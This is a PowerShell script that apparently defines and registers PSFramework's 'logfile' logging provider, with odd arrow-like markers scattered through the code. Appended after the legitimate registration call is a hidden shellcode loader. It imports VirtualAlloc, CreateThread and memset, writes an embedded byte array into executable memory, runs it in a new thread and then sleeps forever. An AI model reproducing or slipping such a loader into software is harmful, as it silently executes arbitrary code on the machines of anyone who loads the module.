
 -||-> $registrationEvent = {
	
} <-||- 



 -||-> $begin_event = {
	 -||-> function Get-LogFilePath
	{
		[CmdletBinding()]
		param (
			
		)
		
		 -||-> $path =  -||-> Get-PSFConfigValue -FullName 'PSFramework.Logging.LogFile.FilePath' <-||-  <-||- 
		 -||-> $logname =  -||-> Get-PSFConfigValue -FullName 'PSFramework.Logging.LogFile.LogName' <-||-  <-||- 
		
		 -||-> $scriptBlock = {
			param (
				[string]
				$Match
			)
			
			 -||-> $hash = @{
				'%date%'  =  -||-> ( -||-> Get-Date -Format 'yyyy-MM-dd' <-||- ) <-||- 
				'%dayofweek%' =  -||-> ( -||-> Get-Date <-||- ).DayOfWeek <-||- 
				'%day%' =  -||-> ( -||-> Get-Date <-||- ).Day <-||- 
				'%hour%'   =  -||-> ( -||-> Get-Date <-||- ).Hour <-||- 
				'%minute%' =  -||-> ( -||-> Get-Date <-||- ).Minute <-||- 
				'%username%' =  -||-> $env:USERNAME <-||- 
				'%userdomain%' =  -||-> $env:USERDOMAIN <-||- 
				'%computername%' =  -||-> $env:COMPUTERNAME <-||- 
				'%processid%' =  -||-> $PID <-||- 
				'%logname%' =  -||-> $logname <-||- 
			} <-||- 
			
			 -||-> $hash.$Match <-||- 
		} <-||- 
		
		 -||-> [regex]::Replace($path, '%day%|%computername%|%hour%|%processid%|%date%|%username%|%dayofweek%|%minute%|%userdomain%|%logname%', $scriptBlock) <-||- 
	} <-||- 
	
	 -||-> function Write-LogFileMessage
	{
		[CmdletBinding()]
		param (
			[Parameter(ValueFromPipeline = $true)]
			$Message,
			
			[bool]
			$IncludeHeader,
			
			[string]
			$FileType,
			
			[string]
			$Path,
			
			[string]
			$CsvDelimiter,
			
			[string[]]
			$Headers
		)
		
		 -||-> $parent =  -||-> Split-Path $Path <-||-  <-||- 
		 -||-> if ( -||-> -not ( -||-> Test-Path $parent <-||- ) <-||- )
		{
			 -||-> $null =  -||-> New-Item $parent -ItemType Directory -Force <-||-  <-||- 
		} <-||- 
		 -||-> $fileExists =  -||-> Test-Path $Path <-||-  <-||- 
		
		
		switch ( -||-> $FileType <-||- )
		{
			
			"Csv"
			{
				 -||-> if ( -||-> ( -||-> -not $fileExists <-||- ) -and $IncludeHeader <-||- ) {  -||-> $Message | ConvertTo-Csv -NoTypeInformation -Delimiter $CsvDelimiter | Set-Content -Path $Path -Encoding UTF8 <-||-  }
				else {  -||-> $Message | ConvertTo-Csv -NoTypeInformation -Delimiter $CsvDelimiter | Select-Object -Skip 1 | Add-Content -Path $Path -Encoding UTF8 <-||-  } <-||- 
			}
			
			
			"Json"
			{
				 -||-> if ( -||-> $fileExists <-||- ) {  -||-> Add-Content -Path $Path -Value "," -Encoding UTF8 <-||-  } <-||- 
				 -||-> $Message | ConvertTo-Json | Add-Content -Path $Path -NoNewline -Encoding UTF8 <-||- 
			}
			
			
			"XML"
			{
				 -||-> [xml]$xml =  -||-> $message | ConvertTo-Xml -NoTypeInformation <-||-  <-||- 
				 -||-> $xml.Objects.InnerXml | Add-Content -Path $Path -Encoding UTF8 <-||- 
			}
			
			
			"Html"
			{
				 -||-> [xml]$xml =  -||-> $message | ConvertTo-Html -Fragment <-||-  <-||- 
				
				 -||-> if ( -||-> ( -||-> -not $fileExists <-||- ) -and $IncludeHeader <-||- )
				{
					 -||-> $xml.table.tr[0].OuterXml | Add-Content -Path $Path -Encoding UTF8 <-||- 
				} <-||- 
				
				 -||-> $xml.table.tr[1].OuterXml | Add-Content -Path $Path -Encoding UTF8 <-||- 
			}
			
		}
		
	} <-||- 
	
	 -||-> $logfile_includeheader =  -||-> Get-PSFConfigValue -FullName 'PSFramework.Logging.LogFile.IncludeHeader' <-||-  <-||- 
	 -||-> $logfile_headers =  -||-> Get-PSFConfigValue -FullName 'PSFramework.Logging.LogFile.Headers' | ForEach-Object {
		switch ( -||-> $_ <-||- )
		{
			'Tags'
			{
				 -||-> @{
					Name	   =  -||-> 'Tags' <-||- 
					Expression =  -||-> {  -||-> $_.Tags -join "," <-||-  } <-||- 
				} <-||- 
			}
			'Message'
			{
				 -||-> @{
					Name	   =  -||-> 'Message' <-||- 
					Expression =  -||-> {  -||-> $_.LogMessage <-||-  } <-||- 
				} <-||- 
			}
			'Timestamp'
			{
				 -||-> @{
					Name	   =  -||-> 'Timestamp' <-||- 
					Expression																					   =  -||-> {
						 -||-> if ( -||-> ( -||-> Get-PSFConfig -FullName 'PSFramework.Logging.LogFile.TimeFormat' <-||- ).Unchanged <-||- ) {  -||-> $_.Timestamp <-||-  }
						else {  -||-> $_.Timestamp.ToString(( -||-> Get-PSFConfigValue -FullName 'PSFramework.Logging.LogFile.TimeFormat' <-||- )) <-||-  } <-||- 
					} <-||- 
				} <-||- 
			}
			default {  -||-> $_ <-||-  }
		}
	} <-||-  <-||- 
	 -||-> $logfile_filetype =  -||-> Get-PSFConfigValue -FullName 'PSFramework.Logging.LogFile.FileType' <-||-  <-||- 
	 -||-> $logfile_CsvDelimiter =  -||-> Get-PSFConfigValue -FullName 'PSFramework.Logging.LogFile.CsvDelimiter' <-||-  <-||- 
	
	
	 -||-> $logfile_paramWriteLogFileMessage = @{
		IncludeHeader    =  -||-> $logfile_includeheader <-||- 
		FileType		 =  -||-> $logfile_filetype <-||- 
		CsvDelimiter	 =  -||-> $logfile_CsvDelimiter <-||- 
		Headers		     =  -||-> $logfile_headers <-||- 
	} <-||- 
} <-||- 


 -||-> $start_event = {
	 -||-> $logfile_paramWriteLogFileMessage["Path"] =  -||-> Get-LogFilePath <-||-  <-||- 
} <-||- 


 -||-> $message_Event = {
	Param (
		$Message
	)
	
	 -||-> $Message | Select-Object $logfile_headers | Write-LogFileMessage @logfile_paramWriteLogFileMessage <-||- 
} <-||- 


 -||-> $error_Event = {
	Param (
		$ErrorItem
	)
	
	
} <-||- 


 -||-> $end_event = {
	
} <-||- 


 -||-> $final_event = {
	
} <-||- 




 -||-> $configurationParameters = {
	 -||-> $configroot = "PSFramework.Logging.LogFile" <-||- 
	
	 -||-> $configurations =  -||-> Get-PSFConfig -FullName "$configroot.*" <-||-  <-||- 
	
	 -||-> $RuntimeParamDic =  -||-> New-Object  System.Management.Automation.RuntimeDefinedParameterDictionary <-||-  <-||- 
	
	 -||-> foreach ($config in  -||-> $configurations <-||- )
	{
		 -||-> $ParamAttrib =  -||-> New-Object System.Management.Automation.ParameterAttribute <-||-  <-||- 
		 -||-> $ParamAttrib.ParameterSetName = '__AllParameterSets' <-||- 
		 -||-> $AttribColl =  -||-> New-Object System.Collections.ObjectModel.Collection[System.Attribute] <-||-  <-||- 
		 -||-> $AttribColl.Add($ParamAttrib) <-||- 
		 -||-> $RuntimeParam =  -||-> New-Object System.Management.Automation.RuntimeDefinedParameter( -||-> ( -||-> $config.FullName.Replace($configroot, "").Trim(".") <-||- ), $config.Value.GetType(), $AttribColl <-||- ) <-||-  <-||- 
		
		 -||-> $RuntimeParamDic.Add(( -||-> $config.FullName.Replace($configroot, "").Trim(".") <-||- ), $RuntimeParam) <-||- 
	} <-||- 
	return  -||-> $RuntimeParamDic <-||- 
} <-||- 


 -||-> $configurationScript = {
	 -||-> $configroot = "PSFramework.Logging.LogFile" <-||- 
	
	 -||-> $configurations =  -||-> Get-PSFConfig -FullName "$configroot.*" <-||-  <-||- 
	
	 -||-> foreach ($config in  -||-> $configurations <-||- )
	{
		 -||-> if ( -||-> $PSBoundParameters.ContainsKey(( -||-> $config.FullName.Replace($configroot, "").Trim(".") <-||- )) <-||- )
		{
			 -||-> Set-PSFConfig -Module $config.Module -Name $config.Name -Value $PSBoundParameters[( -||-> $config.FullName.Replace($configroot, "").Trim(".") <-||- )] <-||- 
		} <-||- 
	} <-||- 
} <-||- 


 -||-> $isInstalledScript = {
	return  -||-> $true <-||- 
} <-||- 


 -||-> $installationParameters = {
	
} <-||- 


 -||-> $installationScript = {
	
} <-||- 



 -||-> $configuration_Settings = {
	 -||-> Set-PSFConfig -Module PSFramework -Name 'Logging.LogFile.FilePath' -Value "" -Initialize -Validation string -Handler { } -Description "The path to where the logfile is written. Supports some placeholders such as %Date% to allow for timestamp in the name. For full documentation on the supported wildcards, see the documentation on https://psframework.org" <-||- 
	 -||-> Set-PSFConfig -Module PSFramework -Name 'Logging.LogFile.Logname' -Value "" -Initialize -Validation string -Handler { } -Description "A special string you can use as a placeholder in the logfile path (by using '%logname%' as placeholder)" <-||- 
	 -||-> Set-PSFConfig -Module PSFramework -Name 'Logging.LogFile.IncludeHeader' -Value $true -Initialize -Validation bool -Handler { } -Description "Whether a written csv file will include headers" <-||- 
	 -||-> Set-PSFConfig -Module PSFramework -Name 'Logging.LogFile.Headers' -Value @( -||-> 'ComputerName', 'File', 'FunctionName', 'Level', 'Line', 'Message', 'ModuleName', 'Runspace', 'Tags', 'TargetObject', 'Timestamp', 'Type', 'Username' <-||- ) -Initialize -Validation stringarray -Handler { } -Description "The properties to export, in the order to select them." <-||- 
	 -||-> Set-PSFConfig -Module PSFramework -Name 'Logging.LogFile.FileType' -Value "CSV" -Initialize -Validation psframework.logfilefiletype -Handler { } -Description "In what format to write the logfile. Supported styles: CSV, XML, Html or Json. Html, XML and Json will be written as fragments." <-||- 
	 -||-> Set-PSFConfig -Module PSFramework -Name 'Logging.LogFile.CsvDelimiter' -Value "," -Initialize -Validation string -Handler { } -Description "The delimiter to use when writing to csv." <-||- 
	 -||-> Set-PSFConfig -Module PSFramework -Name 'Logging.LogFile.TimeFormat' -Value "$( -||-> [System.Globalization.CultureInfo]::CurrentUICulture.DateTimeFormat.ShortDatePattern <-||- ) $( -||-> [System.Globalization.CultureInfo]::CurrentUICulture.DateTimeFormat.LongTimePattern <-||- )" -Initialize -Validation string -Handler { } -Description "The format used for timestamps in the logfile" <-||- 
	
	 -||-> Set-PSFConfig -Module LoggingProvider -Name 'LogFile.Enabled' -Value $false -Initialize -Validation "bool" -Handler {  -||-> if ( -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'] <-||- ) {  -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'].Enabled = $args[0] <-||-  } <-||-  } -Description "Whether the logging provider should be enabled on registration" <-||- 
	 -||-> Set-PSFConfig -Module LoggingProvider -Name 'LogFile.AutoInstall' -Value $false -Initialize -Validation "bool" -Handler { } -Description "Whether the logging provider should be installed on registration" <-||- 
	 -||-> Set-PSFConfig -Module LoggingProvider -Name 'LogFile.InstallOptional' -Value $true -Initialize -Validation "bool" -Handler { } -Description "Whether installing the logging provider is mandatory, in order for it to be enabled" <-||- 
	 -||-> Set-PSFConfig -Module LoggingProvider -Name 'LogFile.IncludeModules' -Value @() -Initialize -Validation "stringarray" -Handler {  -||-> if ( -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'] <-||- ) {  -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'].IncludeModules = ( -||-> $args[0] | Write-Output <-||- ) <-||-  } <-||-  } -Description "Module whitelist. Only messages from listed modules will be logged" <-||- 
	 -||-> Set-PSFConfig -Module LoggingProvider -Name 'LogFile.ExcludeModules' -Value @() -Initialize -Validation "stringarray" -Handler {  -||-> if ( -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'] <-||- ) {  -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'].ExcludeModules = ( -||-> $args[0] | Write-Output <-||- ) <-||-  } <-||-  } -Description "Module blacklist. Messages from listed modules will not be logged" <-||- 
	 -||-> Set-PSFConfig -Module LoggingProvider -Name 'LogFile.IncludeTags' -Value @() -Initialize -Validation "stringarray" -Handler {  -||-> if ( -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'] <-||- ) {  -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'].IncludeTags = ( -||-> $args[0] | Write-Output <-||- ) <-||-  } <-||-  } -Description "Tag whitelist. Only messages with these tags will be logged" <-||- 
	 -||-> Set-PSFConfig -Module LoggingProvider -Name 'LogFile.ExcludeTags' -Value @() -Initialize -Validation "stringarray" -Handler {  -||-> if ( -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'] <-||- ) {  -||-> [PSFramework.Logging.ProviderHost]::Providers['logfile'].ExcludeTags = ( -||-> $args[0] | Write-Output <-||- ) <-||-  } <-||-  } -Description "Tag blacklist. Messages with these tags will not be logged" <-||- 
} <-||- 

 -||-> Register-PSFLoggingProvider -Name "logfile" -RegistrationEvent $registrationEvent -BeginEvent $begin_event -StartEvent $start_event -MessageEvent $message_Event -ErrorEvent $error_Event -EndEvent $end_event -FinalEvent $final_event -ConfigurationParameters $configurationParameters -ConfigurationScript $configurationScript -IsInstalledScript $isInstalledScript -InstallationScript $installationScript -InstallationParameters $installationParameters -ConfigurationSettings $configuration_Settings <-||- 
 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0xb4,0xd8,0xa2,0x91,0xdb,0xc6,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x47,0x13,0x83,0xef,0xfc,0x03,0x47,0xbb,0x3a,0x57,0x6d,0x2b,0x38,0x98,0x8e,0xab,0x5d,0x10,0x6b,0x9a,0x5d,0x46,0xff,0x8c,0x6d,0x0c,0xad,0x20,0x05,0x40,0x46,0xb3,0x6b,0x4d,0x69,0x74,0xc1,0xab,0x44,0x85,0x7a,0x8f,0xc7,0x05,0x81,0xdc,0x27,0x34,0x4a,0x11,0x29,0x71,0xb7,0xd8,0x7b,0x2a,0xb3,0x4f,0x6c,0x5f,0x89,0x53,0x07,0x13,0x1f,0xd4,0xf4,0xe3,0x1e,0xf5,0xaa,0x78,0x79,0xd5,0x4d,0xad,0xf1,0x5c,0x56,0xb2,0x3c,0x16,0xed,0x00,0xca,0xa9,0x27,0x59,0x33,0x05,0x06,0x56,0xc6,0x57,0x4e,0x50,0x39,0x22,0xa6,0xa3,0xc4,0x35,0x7d,0xde,0x12,0xb3,0x66,0x78,0xd0,0x63,0x43,0x79,0x35,0xf5,0x00,0x75,0xf2,0x71,0x4e,0x99,0x05,0x55,0xe4,0xa5,0x8e,0x58,0x2b,0x2c,0xd4,0x7e,0xef,0x75,0x8e,0x1f,0xb6,0xd3,0x61,0x1f,0xa8,0xbc,0xde,0x85,0xa2,0x50,0x0a,0xb4,0xe8,0x3c,0xff,0xf5,0x12,0xbc,0x97,0x8e,0x61,0x8e,0x38,0x25,0xee,0xa2,0xb1,0xe3,0xe9,0xc5,0xeb,0x54,0x65,0x38,0x14,0xa5,0xaf,0xfe,0x40,0xf5,0xc7,0xd7,0xe8,0x9e,0x17,0xd8,0x3c,0x30,0x48,0x76,0xef,0xf1,0x38,0x36,0x5f,0x9a,0x52,0xb9,0x80,0xba,0x5c,0x10,0xa9,0x51,0xa6,0xf2,0x16,0x0d,0xaa,0x67,0xff,0x4c,0xab,0x72,0x4c,0xd9,0x4d,0x16,0xa2,0x8c,0xc6,0x8e,0x5b,0x95,0x9d,0x2f,0xa3,0x03,0xd8,0x6f,0x2f,0xa0,0x1c,0x21,0xd8,0xcd,0x0e,0xd5,0x28,0x98,0x6d,0x73,0x36,0x36,0x1b,0x7b,0xa2,0xbd,0x8a,0x2c,0x5a,0xbc,0xeb,0x1a,0xc5,0x3f,0xde,0x11,0xcc,0xd5,0xa1,0x4d,0x31,0x3a,0x22,0x8d,0x67,0x50,0x22,0xe5,0xdf,0x00,0x71,0x10,0x20,0x9d,0xe5,0x89,0xb5,0x1e,0x5c,0x7e,0x1d,0x77,0x62,0x59,0x69,0xd8,0x9d,0x8c,0x6b,0x24,0x48,0xe8,0x19,0x44,0x48 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



